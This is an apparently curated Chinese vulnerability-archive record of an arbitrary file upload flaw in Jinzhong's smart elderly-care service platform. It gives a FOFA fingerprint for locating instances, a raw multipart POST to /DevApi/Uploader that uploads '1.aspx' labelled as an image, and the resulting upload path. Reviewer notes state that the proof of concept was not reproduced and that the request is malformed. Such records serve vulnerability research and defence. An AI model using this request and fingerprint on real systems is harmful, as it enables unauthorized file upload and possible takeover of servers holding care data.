---
source: "wy876 漏洞文库"
title: "金中智慧医养服务平台 DevApi Uploader上传"
product: "金中智慧医养服务平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，ASPX执行条件未明"
prerequisites: "未说明"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/payri8rhhk98f9mm"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%87%91%E4%B8%AD%E8%BD%AF%E4%BB%B6/%E5%B9%BF%E8%A5%BF%E9%87%91%E4%B8%AD%E8%BD%AF%E4%BB%B6%E9%9B%86%E5%9B%A2%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%99%BA%E6%85%A7%E5%8C%BB%E5%85%BB%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0Uploader%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"Content/css/Login/images/gtx-main-bg00004.png\""
id: "vw-568cc30aabbf33cbb911db8d"
entity_id: "ve-568cc30aabbf33cbb911db8d"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 金中智慧医养服务平台 DevApi Uploader上传

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：金中智慧医养服务平台；DevApi Uploader上传
- 版本、配置及部署条件：未知版本，ASPX执行条件未明
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Length10338与短body不符且multipart缺闭合，123文本不证明RCE
- 固定/Content/Upload日期路径无返回，与558删除例可关联但需分别核验
- 无修复版本/权限条件

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
广西金中软件集团有限公司前身成立于1999年，隶属于广西电信下的三产公司——金中信息产业有限公司，是一家集软件开发、网站建设、网络工程、系统集成和维护服务、通信增值业务和ISP运营服务于一体的高科技IT企业。广西金中软件集团有限公司智慧医养服务平台Uploader存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 智慧医养服务平台

## 三、资产测绘
+ fofa`body="Content/css/Login/images/gtx-main-bg00004.png"`
+ 特征


## 四、漏洞复现
```http
POST /DevApi/Uploader HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Length: 10338

-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/png

123
-----------------------------45250802924973458471174811279
```

> 请求长度说明：原资料 Content-Length 为 10338；保留原始标头；其数值未据实际请求体重新计算或验证。


```plain
/Content/Upload/202407/18/1.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/payri8rhhk98f9mm>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
